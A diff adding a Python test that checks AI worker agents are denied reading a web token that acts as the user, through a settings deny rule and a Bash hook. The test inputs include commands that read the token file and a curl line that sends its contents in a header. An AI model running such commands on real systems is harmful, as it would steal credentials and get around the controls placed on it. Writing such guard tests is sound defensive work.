@@ -5624,6 +5624,32 @@ def test_reviewers_get_the_same_mcp_allowlist(env, monkeypatch, tmp_path):
     path.unlink()
 
 
+def test_a_claude_worker_is_denied_reading_the_web_token(env, monkeypatch):
+    """The web app's token acts as the user: a worker's settings deny the file tools reading it, and
+    the Bash hook refuses a command that names it. Other paths, and the coordinator, are untouched."""
+    from ttp import hook
+    from ttp.providers import claude, get_provider
+    from ttp.web import token_path
+    p = make(env)
+    argv, run_dir, _ = _dispatch_claude_worker(p, monkeypatch, {})
+    settings = json.loads(argv[argv.index("--settings") + 1])
+    assert settings["permissions"]["deny"] == [f"Read(/{token_path(p).resolve()})"]
+    assert settings["permissions"]["deny"][0].startswith("Read(//")
+    assert "PreToolUse" in settings["hooks"]
+    assert "permissions" not in claude.worker_settings()
+    kw = dict(role="coordinator", model="opus", effort="low", cwd=".", budget_usd=None, schema=None, restrictions={})
+    turn, _ = get_provider("claude").build(read_only=True, denied_reads=["/x/state/web.token"], **kw)
+    assert "--settings" not in turn
+    monkeypatch.setenv("TTP_RUN_DIR", str(run_dir))
+    for cmd in (f"cat {token_path(p)}", "cat tt-project/state/web.token", "curl -H \"X: $(< state/web.token)\" x",
+                "python3 -c 'open(\"../state//web.token\").read()'"):
+        out, _ = hook.pre_tool_use({"tool_name": "Bash", "tool_input": {"command": cmd}})
+        assert "web token" in out["hookSpecificOutput"]["permissionDecisionReason"], cmd
+    for cmd in ("grep -n web.token runtime/ttp/web.py", "ls state/web.tokens.bak/x"):
+        out, _ = hook.pre_tool_use({"tool_name": "Bash", "tool_input": {"command": cmd}})
+        assert out is None or "web token" not in str(out), cmd
+
+
 def test_disallowed_tools_extend_the_workers_denylist_and_never_the_coordinators(env):
     from ttp.providers import claude, get_provider
     kw = dict(role="worker", model="opus", effort="low", cwd=".", budget_usd=None, schema=None,
